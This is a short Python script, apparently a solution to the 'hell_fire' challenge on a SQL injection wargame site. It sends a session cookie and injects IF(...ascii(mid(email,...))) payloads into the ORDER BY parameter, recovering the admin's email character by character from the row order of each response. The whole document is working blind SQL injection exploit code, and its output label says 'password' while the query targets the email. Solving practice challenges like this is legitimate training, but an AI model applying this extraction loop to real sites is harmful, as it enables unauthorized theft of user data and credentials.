import urllib.request
import requests

url='https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
headers = { 'Cookie': 'PHPSESSID=mgh66e47p2g12f7tccsgq9p8rn' }
pw=""

for i in range (1,29):
    for j in range(48, 123):
        if (j == 95):
            continue
        query='?order=IF(id=%27admin%27%20and%20ascii(mid(email,{},1))={}},%201,%203)'.format(i, j)
        r = requests.get(url + query, headers=headers)
        if r.text.find("<td>admin</td>") < r.text.find("<td>rubiya</td>"):
            pw = pw + chr(j)
            print('substr(password,1,{}) is '.format(i), pw)
            break